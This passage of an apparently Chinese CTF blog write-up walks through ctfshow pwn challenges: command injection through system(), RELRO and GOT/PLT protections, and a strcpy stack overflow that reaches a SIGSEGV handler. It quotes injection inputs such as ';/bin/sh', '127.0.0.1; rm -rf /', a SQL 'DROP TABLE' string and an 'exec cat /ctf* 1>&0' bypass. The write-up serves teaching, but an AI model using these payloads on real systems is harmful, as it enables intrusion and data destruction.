/ctf*”或“;/bin/sh”，来执行任意命令。</p><p>这是因为在Linux中，分号（;）用于分隔多个命令，所以用户可以通过输入包含分号的字符串来执行多个命令。此外，用户的输入并没有长度限制，所以用户可以输入任意长度的命令。</p><p>因此，这个程序没有正确地处理用户的输入，允许用户通过输入特殊的字符串来执行任意命令。这是一个典型的命令注入攻击。</p><h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">read(0, buf, 0xAuLL); // 读取用户的输入，存储在buf中 strcat(dest, buf); // 将buf中的字符串追加到dest中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是一个在C语言中常见的从用户接收输入并执行命令的模式。下面是每个命令的详细解析：</p><ol><li><p><code>read(0, buf, 0xAuLL);</code></p><p><code>read</code> 是一个系统调用，用于从文件描述符中读取数据。在这里，<code>0</code> 是文件描述符，代表标准输入（stdin），<code>buf</code> 是一个字符数组，用于存储从标准输入读取的数据，<code>0xAuLL</code> 是要读取的字节数，这里是16进制的<code>A</code>，转换为十进制就是10，所以这个命令会从标准输入读取10个字节的数据，存储在<code>buf</code>中。</p></li><li><p><code>strcat(dest, buf);</code></p><p><code>strcat</code> 是一个标准库函数，用于将两个字符串连接起来。在这里，<code>dest</code> 是目标字符串，<code>buf</code> 是源字符串，这个命令会将<code>buf</code>中的字符串追加到<code>dest</code>的末尾。需要注意的是，<code>strcat</code> 不会检查<code>dest</code>是否有足够的空间来存储结果，如果<code>dest</code>的空间不足，就会发生缓冲区溢出，这可能导致程序崩溃或者被攻击者利用。</p></li><li><p><code>system(dest);</code></p><p><code>system</code> 是一个标准库函数，用于执行一个系统命令。在这里，<code>dest</code> 是要执行的命令，这个命令会被传递给系统的命令解释器（通常是<code>/bin/sh</code>或者<code>cmd.exe</code>），命令解释器会执行这个命令，然后返回结果。需要注意的是，<code>system</code> 函数会执行任何传递给它的命令，如果这个命令是由用户提供的，那么用户就可以执行任意的系统命令，这可能导致安全问题。</p></li><li><p>0xAuLL</p><p>在C语言中，<code>0xAuLL</code>是一个无符号长长整型（unsigned long long）常量的表示方法。这里的<code>0xA</code>是一个十六进制的数，等于十进制的10。<code>u</code>和<code>LL</code>是后缀，用来指定这个常量的类型。</p><ul><li><code>u</code>或<code>U</code>后缀表示这是一个无符号（unsigned）整数。无符号整数只能表示非负数。</li><li><code>LL</code>或<code>ll</code>后缀表示这是一个长长整型（long long）整数。在大多数系统中，长长整型整数至少有64位。</li></ul><p>所以，<code>0xAuLL</code>表示的是一个无符号长长整型整数，值为10。</p></li></ol><h2 id="4、命令注入漏洞补充"><a href="#4、命令注入漏洞补充" class="headerlink" title="4、命令注入漏洞补充"></a>4、命令注入漏洞补充</h2><p>命令注入漏洞是一种常见的安全漏洞，它存在于当应用程序将不可信的输入用作命令或参数并执行时。除了上述的例子，还有许多其他的命令注入漏洞的例子，包括：</p><ol><li><p><strong>Shell命令注入</strong>：这是最常见的命令注入漏洞类型。如果应用程序使用用户提供的输入构建并执行shell命令，那么攻击者可以通过提供包含额外命令的输入来执行任意命令。例如，如果应用程序使用<code>system("ping " + user_input)</code>来执行ping命令，那么攻击者可以提供<code>"127.0.0.1; rm -rf /"</code>作为输入，这将导致应用程序执行<code>rm -rf /</code>命令，删除所有文件。</p></li><li><p><strong>SQL命令注入</strong>：这是另一种常见的命令注入漏洞类型。如果应用程序使用用户提供的输入构建并执行SQL命令，那么攻击者可以通过提供包含额外命令的输入来执行任意SQL命令。例如，如果应用程序使用<code>"SELECT * FROM users WHERE name = '" + user_input + "'"</code>来查询用户，那么攻击者可以提供<code>"'; DROP TABLE users; --"</code>作为输入，这将导致应用程序执行<code>DROP TABLE users</code>命令，删除users表。</p></li><li><p><strong>LDAP命令注入</strong>：如果应用程序使用用户提供的输入构建并执行LDAP（轻量级目录访问协议）查询，那么攻击者可以通过提供包含额外命令的输入来执行任意LDAP查询。</p></li><li><p><strong>OS命令注入</strong>：这是一种更广泛的命令注入漏洞类型，包括shell命令注入。如果应用程序使用用户提供的输入构建并执行操作系统命令，那么攻击者可以通过提供包含额外命令的输入来执行任意操作系统命令。</p></li></ol><p>防止命令注入的最佳实践是永远不要使用用户提供的输入构建并执行命令。如果必须这样做，那么应该使用参数化的接口，并对用户的输入进行严格的验证和过滤。</p><h2 id="六、pwn018"><a href="#六、pwn018" class="headerlink" title="六、pwn018"></a>六、pwn018</h2><h3 id="echo-‘flag-is-here’-gt-gt-x2F-ctfshow-flag中-gt-gt-和-gt-的区别"><a href="#echo-‘flag-is-here’-gt-gt-x2F-ctfshow-flag中-gt-gt-和-gt-的区别" class="headerlink" title="echo ‘flag is here’ >> /ctfshow_flag中>>和>的区别"></a>echo ‘flag is here’ &gt;&gt; /ctfshow_flag中&gt;&gt;和&gt;的区别</h3><ol><li><code>echo 'flag is here' &gt;&gt; /ctfshow_flag</code>：这个命令会将字符串 <code>'flag is here'</code> 追加到文件 <code>/ctfshow_flag</code> 的末尾。如果文件 <code>/ctfshow_flag</code> 不存在，那么这个命令会创建这个文件。如果文件已经存在，那么这个命令不会覆盖文件的原有内容，而是在原有内容后面添加新的内容。</li><li><code>echo 'flag is here' &gt; /ctfshow_flag</code>：这个命令会将字符串 <code>'flag is here'</code> 写入文件 <code>/ctfshow_flag</code>。如果文件 <code>/ctfshow_flag</code> 不存在，那么这个命令会创建这个文件。如果文件已经存在，那么这个命令会覆盖文件的原有内容，只保留新的内容。</li></ol><p>所以，这两个命令的主要区别在于 <code>&gt;&gt;</code> 是追加内容，而 <code>&gt;</code> 是覆盖内容。</p><h2 id="七、pwn019"><a href="#七、pwn019" class="headerlink" title="七、pwn019"></a>七、pwn019</h2><h3 id="1-C源代码"><a href="#1-C源代码" class="headerlink" title="1.C源代码"></a>1.C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v5; // [rsp+38h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 1, 0LL);  puts(s);  puts(asc_BF0);  puts(asc_C70);  puts(asc_D00);  puts(asc_D90);  puts(asc_E18);  puts(asc_EB0);  puts("    * *************************************                           ");  puts(aClassifyCtfsho);  puts("    * Type  : Linux_Security_Mechanisms                               ");  puts("    * Site  : https://ctf.show/                                       ");  puts("    * Hint  : Turn off output, how to get flag? ");  puts("    * *************************************                           ");  if ( fork() )  {    wait(0LL);    sleep(3u);    printf("flag is not here!");  }  else  {    puts("give you a shell! now you need to get flag!");    fclose(_bss_start);    read(0, buf, 0x20uLL);    system(buf);  }  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-关闭输出流，标准输出重定向到输入（绕过）"><a href="#2-关闭输出流，标准输出重定向到输入（绕过）" class="headerlink" title="2.关闭输出流，标准输出重定向到输入（绕过）"></a>2.关闭输出流，标准输出重定向到输入（绕过）</h3><ol><li><p>fclose() : 关闭文件输出流。</p></li><li><p>read(0, &amp;buf, 0x20uLL) : 从标准输入中读取用户输入的命令，并存储在 buf 中。</p></li><li><p>system(&amp;buf) : 执行用户输入的命令。</p></li></ol><p>我们可以使用了 exec 函数来执行 sh 命令，并使用 1&gt;&amp;0 来进行输出重定向。这个命令将标准输出</p><p>重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p><p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可</p><p>以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，</p><p>可以在该环境中执行命令并与用户进行交互。</p><p>这里限制了20个字节，反弹shell</p><p>也可以直接exec cat /ctf* 1&gt;&amp;0 将 cat /ctf* 命令的输出发送到标准输入，实际上就是将命令的输</p><p>出再次输出到屏幕上。</p><p>的话理论上也可行，感兴趣的可以自行去尝试。</p><h3 id="3-bash、sh和bin-x2F-sh区别"><a href="#3-bash、sh和bin-x2F-sh区别" class="headerlink" title="3.bash、sh和bin/sh区别"></a>3.bash、sh和bin/sh区别</h3><p><code>sh</code>和<code>/bin/sh</code>基本上是指向同一个东西，都是指向shell，但是在某些系统中，它们可能会有所不同。</p><p><code>sh</code>是一个shell，也就是命令行解释器，它读取和执行用户输入的命令或者脚本文件中的命令。<code>sh</code>通常指向系统默认的shell。</p><p><code>/bin/sh</code>是一个路径，它指向的是文件系统中<code>/bin</code>目录下的<code>sh</code>程序。在很多Unix和类Unix系统中，<code>/bin/sh</code>通常是一个指向Bourne shell或者与Bourne shell兼容的shell（如Bash，Dash等）的符号链接。</p><p>在某些系统中，<code>sh</code>和<code>/bin/sh</code>可能会指向不同的shell。例如，在一些系统中，<code>sh</code>可能会指向用户默认的shell（这可以是Bash，Zsh，Ksh，Csh等），而<code>/bin/sh</code>则始终指向Bourne shell或者与Bourne shell兼容的shell。</p><p>所以，<code>sh</code>和<code>/bin/sh</code>是否完全一样，取决于具体的系统配置。在大多数情况下，你可以认为它们是一样的，但在某些特定的系统或者配置中，它们可能会有所不同。</p><p>Bash（Bourne Again SHell）是一个为GNU项目开发的Unix shell，由Brian Fox在1989年创建。它是Bourne Shell（sh）的替代品，包含了更多的特性，例如命令行编辑、命令历史、命令别名、作业控制等。</p><p>在很多现代的Unix和类Unix系统（如Linux和macOS）中，Bash是默认的shell。这意味着当你打开一个终端窗口或者运行一个shell脚本时，你通常会使用Bash。</p><p><code>/bin/sh</code>在很多系统中是指向Bash或者其他与Bourne Shell兼容的shell（如Dash）的符号链接。这意味着当你运行<code>/bin/sh</code>或者<code>sh</code>时，你实际上可能是在运行Bash或者其他与Bourne Shell兼容的shell。</p><p>然而，当Bash作为<code>/bin/sh</code>运行时，它会启动一个特殊的兼容模式，这个模式下Bash会尽可能地模仿Bourne Shell的行为，并且禁用一些Bash的特性。这是为了确保<code>/bin/sh</code>脚本在不同的系统上的行为是一致的，即使这些系统使用不同的shell。</p><p>所以，Bash和<code>sh</code>、<code>/bin/sh</code>的关系是：Bash是一个更强大的shell，它包含了Bourne Shell的所有特性并且添加了更多的特性。在很多系统中，<code>sh</code>和<code>/bin/sh</code>实际上就是Bash，但是当Bash作为<code>sh</code>或者<code>/bin/sh</code>运行时，它会模仿Bourne Shell的行为。</p><h2 id="八、pwn20"><a href="#八、pwn20" class="headerlink" title="八、pwn20"></a>八、pwn20</h2><h3 id="objdump-R-pwn020"><a href="#objdump-R-pwn020" class="headerlink" title="objdump -R pwn020"></a>objdump -R pwn020</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230718234651649.png" alt="image-20230718234651649"></p><h3 id="1、RELRO"><a href="#1、RELRO" class="headerlink" title="1、RELRO"></a>1、RELRO</h3><p>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。它主要</p><p>通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure Linkage</p><p>Table，简称 PLT）的可写性来防止针对这些结构的攻击。RELRO保护有三种状态：</p><ol><li>No RELRO：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指</li></ol><p>针，从而进行攻击。这是最弱的保护状态。</p><ol start="2"><li>Partial RELRO：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可</li></ol><p>写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p><ol start="3"><li>Full RELRO：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构</li></ol><p>的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p><h3 id="2、got表和plt表"><a href="#2、got表和plt表" class="headerlink" title="2、got表和plt表"></a>2、got表和plt表</h3><p>题目中的.got表和.got.plt表是在Linux下的动态链接机制中的两个重要部分，它们分别是全局偏移表(Global Offset Table, GOT)和过程链接表(Procedure Linkage Table, PLT)。</p><ol><li>.got表(Global Offset Table)：这是一个由系统动态链接器创建的表，用于存储动态链接库函数的实际运行时地址。当程序调用一个库函数时，它会通过.got表找到这个函数在内存中的实际地址，然后跳转到那里执行。这个表在程序运行时是可写的，因为动态链接器需要在运行时填充这个表。</li><li>.got.plt表(Procedure Linkage Table)：这是一个由编译器创建的表，用于存储程序中每个库函数的”跳板”地址。当程序第一次调用一个库函数时，它会跳转到.got.plt表中的对应项，然后通过一个”跳板”函数跳转到动态链接器，由动态链接器查找函数的实际地址，填充到.got表中，然后跳转到那里执行。这个表在程序运行时通常是不可写的，因为一旦填充完成，就不需要再修改了。</li></ol><h3 id="3-objdump-R-pwn020"><a href="#3-objdump-R-pwn020" class="headerlink" title="3.objdump -R  pwn020"></a>3.objdump -R  pwn020</h3><ul><li><code>R_X86_64_GLOB_DAT</code> 类型的记录通常用于全局数据的重定位，对应的是 <code>.got</code> 表。在程序运行时，动态链接器需要在运行时填充这个表，因此 <code>.got</code> 表是可写的。</li><li><code>R_X86_64_JUMP_SLOT</code> 类型的记录通常用于函数的重定位，对应的是 <code>.got.plt</code> 表。这个表在程序运行时通常是不可写的，因为一旦填充完成，就不需要再修改了。</li></ul><h3 id="4-readelf-S-pwn020-section"><a href="#4-readelf-S-pwn020-section" class="headerlink" title="4.readelf -S pwn020  (section)"></a>4.readelf -S pwn020  (section)</h3><p><code>readelf -S pwn020</code> 命令的输出显示了 <code>pwn020</code> 这个 ELF 文件的节区头部表（Section Header Table）。这个表包含了文件中所有节区（section）的信息，包括它们的名字、类型、大小、地址等。</p><h2 id="九、pwn021"><a href="#九、pwn021" class="headerlink" title="九、pwn021"></a>九、pwn021</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230719014140979.png" alt="image-20230719014140979"></p><h3 id="1-checksec-pwn021"><a href="#1-checksec-pwn021" class="headerlink" title="1.checksec pwn021"></a>1.checksec pwn021</h3><p>发现 Partial RELRO</p><h3 id="2-objdump-R-pwn021"><a href="#2-objdump-R-pwn021" class="headerlink" title="2.objdump -R pwn021"></a>2.objdump -R pwn021</h3><p>检查got和got.ptl是否存在</p><h3 id="3-readelf-l-pwn021"><a href="#3-readelf-l-pwn021" class="headerlink" title="3.readelf  -l  pwn021"></a>3.readelf  -l  pwn021</h3><p>我们可以看到 <code>.got</code> 节被映射到了<strong>第三个段</strong>，这个段具有读写权限。这就是我们判断 <code>.got</code> 是可写的依据。</p><p>然而，我们也可以看到 <code>.got</code> 节被映射到了 <code>GNU_RELRO</code> 段。<code>GNU_RELRO</code> 段是一个<strong>标记段</strong>，它标记了一部分内存区域在程序开始运行后应该被设置为<strong>只读</strong>。这就是为什么 <code>.got</code> 在程序开始运行后会变为只读的原因。</p><h4 id="1-计算GNU-RELRO-段中只读地址范围"><a href="#1-计算GNU-RELRO-段中只读地址范围" class="headerlink" title="1.计算GNU_RELRO 段中只读地址范围"></a>1.计算<code>GNU_RELRO</code> 段中只读地址范围</h4><p>这里的四个十六进制数值分别代表：</p><ul><li>Offset：文件中的偏移量</li><li>VirtAddr：虚拟内存中的地址</li><li>PhysAddr：物理内存中的地址（对于可执行文件，这通常与虚拟地址相同）</li><li>FileSiz/MemSiz：在文件中的大小/在内存中的大小</li></ul><p><code>GNU_RELRO</code> 段在虚拟内存中的起始地址是 <code>0x0000000000600e10</code>，大小是 <code>0x00000000000001f0</code>。所以，被标记为只读的地址范围是从 <code>0x0000000000600e10</code> 到 <code>0x0000000000600e10 + 0x00000000000001f0</code>。</p><p>注：在计算地址范围时，<code>FileSiz</code> 是指在文件中的大小，而 <code>MemSiz</code> 是指在内存中的大小。在大多数情况下，这两个值是相同的，但在某些情况下，它们可能会有所不同。例如，对于 <code>.bss</code> 段（未初始化的全局变量），在文件中的大小是 0，但在内存中的大小则是实际的变量大小。</p><p>对于 <code>GNU_RELRO</code> 段，我们通常关注的是 <code>MemSiz</code>，因为这个值决定了在内存中哪些地址被标记为只读。在你的例子中，<code>MemSiz</code> 是 <code>0x00000000000001f0</code>，所以被标记为只读的地址范围是从 <code>0x0000000000600e10</code> 到 <code>0x0000000000600e10 + 0x00000000000001f0</code>。</p><h3 id="4、ogjdump-R-pwn022"><a href="#4、ogjdump-R-pwn022" class="headerlink" title="4、ogjdump  -R pwn022"></a>4、ogjdump  -R pwn022</h3><p>600ff0和601020明显是两个不同的页，所以可读可写都可能不同</p><h2 id="十、pwn022"><a href="#十、pwn022" class="headerlink" title="十、pwn022"></a>十、pwn022</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230719015345486.png" alt="image-20230719015345486"></p><h3 id="got-plt不存在的原因"><a href="#got-plt不存在的原因" class="headerlink" title="got.plt不存在的原因"></a>got.plt不存在的原因</h3><p><code>readelf -S pwn022</code> 的输出中，我们可以看到 <code>.got</code> 表存在，但是并没有 <code>.got.plt</code> 表。这意味着 <code>pwn022</code> 这个程序没有 <code>.got.plt</code> 表。</p><p>这可能是因为 <code>pwn022</code> 这个程序在链接时没有使用 <code>-z lazy</code> 选项。默认情况下，GCC 编译器会使用 <code>-z lazy</code> 选项来链接程序，这会导致生成 <code>.got.plt</code> 表。然而，如果程序在链接时使用了 <code>-z now</code> 选项，那么就不会生成 <code>.got.plt</code> 表，所有的函数调用都会直接通过 <code>.got</code> 表进行。</p><p>所以，虽然 <code>objdump -R pwn022</code> 的输出显示有 <code>R_X86_64_JUMP_SLOT</code> 类型的记录，这通常对应 <code>.got.plt</code> 表，但是实际上 <code>pwn022</code> 这个程序并没有 <code>.got.plt</code> 表。这可能是因为 <code>pwn022</code> 这个程序在链接时使用了 <code>-z now</code> 选项，导致所有的函数调用都直接通过 <code>.got</code> 表进行，而没有使用 <code>.got.plt</code> 表。</p><h2 id="十一、pwn023"><a href="#十一、pwn023" class="headerlink" title="十一、pwn023"></a>十一、pwn023</h2><h3 id="C源代码-1"><a href="#C源代码-1" class="headerlink" title="C源代码"></a>C源代码</h3><h4 id="（一）main函数"><a href="#（一）main函数" class="headerlink" title="（一）main函数"></a>（一）main函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp) {  __gid_t v3; // 定义一个组标识符变量  int v5; // 未在代码中使用的整型变量  int v6; // 未在代码中使用的整型变量  int v7; // 未在代码中使用的整型变量  FILE *stream; // 定义一个文件指针  stream = fopen("/ctfshow_flag", "r"); // 打开名为"/ctfshow_flag"的文件进行读取  if ( !stream ) // 如果无法打开文件  {    puts("/ctfshow_flag: No such file or directory."); // 输出错误信息    exit(0); // 退出程序  }  fgets(flag, 64, stream); // 从上述文件中读取64个字符并存储在flag中  signal(11, (__sighandler_t)sigsegv_handler); // 设置SIGSEGV信号的处理函数为sigsegv_handler  v3 = getegid(); // 获取有效的组ID  setresgid(v3, v3, v3, v5, v6, v7, v3); // 更改真实、有效和保存的组ID  puts(asc_8048940); // 输出某个字符串  puts(asc_80489B4); // 输出某个字符串  puts(asc_8048A30); // 输出某个字符串  puts(asc_8048ABC); // 输出某个字符串  puts(asc_8048B4C); // 输出某个字符串  puts(asc_8048BD0); // 输出某个字符串  puts(asc_8048C64); // 输出某个字符串  puts("    * *************************************                           "); // 输出某个字符串  puts(aClassifyCtfsho); // 输出某个字符串  puts("    * Type  : Linux_Security_Mechanisms                               "); // 输出某个字符串  puts("    * Site  : https://ctf.show/                                       "); // 输出某个字符串  puts("    * Hint  : No canary found                                         "); // 输出某个字符串  puts("    * *************************************                           "); // 输出某个字符串  puts("How to input ?"); // 输出某个字符串  if ( argc &gt; 1 ) // 如果命令行参数的数量大于1    ctfshow((char *)argv[1]); // 调用ctfshow函数处理第二个命令行参数  return 0; // 返回0，表示程序执行成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-signal函数"><a href="#1-signal函数" class="headerlink" title="1.signal函数"></a>1.signal函数</h5><p><code>signal</code>是一个C语言的库函数，其作用是设置处理特定信号的函数。<code>signal</code>函数的原型如下：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void (*signal(int signum, void (*handler)(int)))(int);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个函数接受两个参数：一个是信号的编号，另一个是一个函数指针，指向处理该信号的函数。当程序收到指定的信号时，它就会调用指定的函数。</p><p>在你提供的代码中，<code>signal(11, (__sighandler_t)sigsegv_handler);</code>这一行是在设置当程序收到编号为11的信号时应该调用的函数。在Unix和Linux系统中，信号编号11通常是<code>SIGSEGV</code>，代表”segmentation violation”，也就是我们常说的”分段错误”。分段错误通常是由于程序试图访问它没有权限访问的内存区域引起的。</p><p><code>(__sighandler_t)sigsegv_handler</code>是一个函数指针，指向处理<code>SIGSEGV</code>信号的函数。在这个代码中，<code>sigsegv_handler</code>是一个已经定义好的函数，它会在接收到<code>SIGSEGV</code>信号时被调用。</p><p>所以，<code>signal(11, (__sighandler_t)sigsegv_handler);</code>这一行的意思就是：“当程序试图访问非法内存并触发<code>SIGSEGV</code>信号时，就调用<code>sigsegv_handler</code>函数进行处理。”这也是为什么这个程序可以通过缓冲区溢出来触发<code>SIGSEGV</code>并执行<code>sigsegv_handler</code>，从而利用这个漏洞来达到目的的原因。</p><h5 id="2-sighandler-函数"><a href="#2-sighandler-函数" class="headerlink" title="2. __sighandler_函数"></a>2. __sighandler_函数</h5><p><code>(__sighandler_t)</code>是一个函数指针类型，用于UNIX和Linux系统中的信号处理。它的定义通常在<code>&lt;signal.h&gt;</code>头文件中，该类型的函数接受一个整数参数（代表信号编号）并无返回值。</p><p>在代码<code>signal(11, (__sighandler_t)sigsegv_handler);</code>中，<code>(__sighandler_t)</code>实际上是一个强制类型转换，它将<code>sigsegv_handler</code>函数转换为一个<code>__sighandler_t</code>类型的函数指针，以满足<code>signal</code>函数的参数要求。此处需要注意的是，根据你之前提供的<code>sigsegv_handler</code>函数的定义，它不接受任何参数并且没有返回值，这与<code>__sighandler_t</code>类型的要求是一致的。</p><p>所以，当我们在<code>signal</code>函数调用中看到<code>(__sighandler_t)sigsegv_handler</code>时，这意味着<code>sigsegv_handler</code>函数被当作一个信号处理函数来使用，它将在收到相应的信号时被调用。</p><p>总结一下，<code>(__sighandler_t)</code>是一个类型，用于定义处理信号的函数的函数指针。而在<code>signal</code>函数中，我们需要将我们的处理函数转换为这个类型，以便于系统在接收到相应的信号时调用它。</p><h5 id="3-signal-11-sighandler-t-sigsegv-handler"><a href="#3-signal-11-sighandler-t-sigsegv-handler" class="headerlink" title="3. signal(11, (__sighandler_t)sigsegv_handler)"></a>3. signal(11, (__sighandler_t)sigsegv_handler)</h5><p>在这个程序中，<code>signal</code>函数被用来设置当接收到<code>SIGSEGV</code>信号（即分段错误，通常由于非法内存访问导致）时的处理函数为<code>sigsegv_handler</code>。分段错误通常会导致程序终止，但在这个程序中，它被特别处理了。</p><p>当发生缓冲区溢出时，可能会覆盖掉程序的其他内存区域，包括栈、堆、数据段或者代码段。如果能够成功地控制这种溢出，我们可能就可以利用这个<code>signal</code>函数的设置来执行任意代码。</p><p>具体来说，当缓冲区溢出发生在<code>ctfshow</code>函数中时，如果我们能够精心地控制输入字符串，可能可以修改返回地址或者其他重要的数据，导致程序执行我们想要的代码。当然，我们的代码可能尝试访问非法内存，这将会触发<code>SIGSEGV</code>信号。然而，由于<code>signal</code>的设置，<code>SIGSEGV</code>并不会使得程序终止，而是转向执行<code>sigsegv_handler</code>。如果我们能够控制<code>sigsegv_handler</code>函数的行为，我们就可以最终利用这个溢出漏洞来执行任意代码。</p><p>需要注意的是，实际上进行这样的攻击需要很高的技术能力，包括但不限于深入理解程序的内存布局、栈的工作原理，以及具体的机器代码等等。另外，现代操作系统通常会有各种安全机制（比如地址空间布局随机化、堆栈保护等等）来防止这样的攻击，所以在实践中，进行这样的攻击并不容易。</p><h4 id="（二）sigsegv-handler函数"><a href="#（二）sigsegv-handler函数" class="headerlink" title="（二）sigsegv_handler函数"></a>（二）sigsegv_handler函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __noreturn sigsegv_handler(){  fprintf(stderr, "%s\n", flag); // 向标准错误流stderr打印flag字符串  fflush(stderr); // 刷新stderr，确保flag被输出  exit(1); // 以退出码1结束程序}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="（三）ctfshow函数"><a href="#（三）ctfshow函数" class="headerlink" title="（三）ctfshow函数"></a>（三）ctfshow函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">char *__cdecl ctfshow(char *src){  char dest[58]; //[esp+Ah] [ebp-3Eh] BYREF    // 定义一个大小为58的字符数组dest  return strcpy(dest, src); // 将src复制到dest并返回dest  // 注意：此处存在潜在的缓冲区溢出风险，如果src的长度超过58，会导致缓冲区溢出}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-栈溢出-覆盖地址"><a href="#1-栈溢出-覆盖地址" class="headerlink" title="1.栈溢出(覆盖地址)"></a>1.栈溢出(覆盖地址)</h4><p>**覆盖函数地址:**在这段代码中的注释<code>[esp+Ah] [ebp-3Eh] BYREF</code>是一个常见的反汇编注释格式，用于表示变量在函数栈帧中的相对位置。</p><p><code>esp</code>和<code>ebp</code>都是x86架构中的寄存器。<code>esp</code>（Stack Pointer）指向栈顶，<code>ebp</code>（Base Pointer）指向当前函数的栈底（也就是栈帧的基地址）。这两个寄存器在函数调用时被用来管理函数的栈空间。</p><p><code>[esp+Ah]</code>和<code>[ebp-3Eh]</code>都是表示相对于<code>esp</code>和<code>ebp</code>的偏移。<code>Ah</code>和<code>3Eh</code>都是十六进制的数，分别表示10和62。</p><p>这意味着<code>dest</code>数组位于<code>ebp</code>向上（地址减小的方向）偏移62字节的位置，或者<code>esp</code>向下（地址增大的方向）偏移10字节的位置。通常，我们选择使用<code>ebp</code>的相对位置，因为在函数内部，<code>esp</code>的值可能会因为局部变量的分配和释放而发生变化，而<code>ebp</code>在整个函数内部都保持不变。</p><p>所以，我们选择了<code>3Eh</code>，即62，作为<code>dest</code>数组的大小，因为在这个函数的栈帧中，<code>dest</code>的位置是从<code>ebp</code>向上偏移62字节的地方。当我们需要覆盖到<code>dest</code>之后的内存时，我们需要写入至少62个字节，然后再写入额外的字节以覆盖函数的返回地址或其他可能的数据。</p><p><strong>覆盖返回地址：</strong>在C语言中，当一个函数被调用时，CPU需要知道在哪里可以找到这个函数的代码，并且在函数结束后应该返回到哪里。为了实现这个目标，函数的返回地址会在函数被调用时被自动压入栈中。因此，当函数执行完成后，它可以通过弹出这个返回地址来找到应该返回的位置。</p><p>在32位的系统中，一个地址是32位（也就是4字节）的，因此函数的返回地址也是4字节的。这就是为什么我们在覆盖缓冲区时需要额外覆盖4个字节。</p><p>当我们控制了这4个字节，我们实际上可以控制函数返回时的跳转位置。这意味着，如果我们能够精心构造这4个字节，我们可以使程序跳转到任何我们想要的位置，例如一个包含恶意代码的内存段。</p><h4 id="2-cyclic生成覆盖地址序列（pwntools工具）"><a href="#2-cyclic生成覆盖地址序列（pwntools工具）" class="headerlink" title="2.cyclic生成覆盖地址序列（pwntools工具）"></a>2.cyclic生成覆盖地址序列（pwntools工具）</h4><p><code>cyclic</code>工具可以生成一个循环的、可预测的、不重复的字符串序列。这种序列通常用于确定缓冲区溢出时，溢出点的确切位置。</p><p><code>cyclic66</code>就是生成一个长度为66的这样的序列。</p><p>这样的序列有一个特性，那就是任何长度为4的子串在这个序列中都只出现一次。所以当你观察到程序崩溃，并且可以从崩溃处获取4个字节的信息时，你可以通过这4个字节在<code>cyclic</code>生成的序列中的位置，来确定溢出点的位置。</p><p>比如，你首先用<code>cyclic 200</code>生成一个200字节的序列，然后把它输入到你的程序中，导致程序崩溃。然后你从崩溃信息中获取到了一个4字节的值，你可以用<code>cyclic</code>库中的<code>cyclic_find</code>函数，通过这个4字节的值，来确定溢出点的位置。</p><h4 id="3-cdecl"><a href="#3-cdecl" class="headerlink" title="3.__cdecl"></a>3.__cdecl</h4><p><code>__cdecl</code> 是一个关于函数调用约定的修饰符，主要用于 C 和 C++ 中。它规定了函数参数的压栈顺序以及由谁来清理堆栈等规则。</p><p>在 <code>__cdecl</code> 的调用约定中，参数从右至左依次压入堆栈，也就是最右边的参数首先被压入堆栈。此外，调用方（也就是函数的调用者）负责清理堆栈，即回收堆栈空间。</p><p>这个调用约定主要在 x86 架构下的 Windows 和 Linux 编程中使用，而在其他一些系统或者体系结构中，这种调用约定可能会被忽略。</p><p>在代码中，<code>char *__cdecl ctfshow(char *src)</code> 表示 <code>ctfshow</code> 是一个函数，它的调用约定是 <code>__cdecl</code>，接受一个 <code>char *</code> 类型的参数 <code>src</code>，并返回一个 <code>char *</code> 类型的值。</p><h3 id="四、argc和argv"><a href="#四、argc和argv" class="headerlink" title="四、argc和argv"></a>四、argc和argv</h3><p><code>argc</code> 是一个在 C 语言和许多其他编程语言中使用的参数。它是 “argument count” 的缩写，代表传递给程序的命令行参数的数量。<code>argc</code> 是一个整数，至少为 1。当 <code>argc</code> 为 1 时，表示程序本身没有接收到任何额外的命令行参数，只有程序自身的名称。这个名称是存储在参数数组 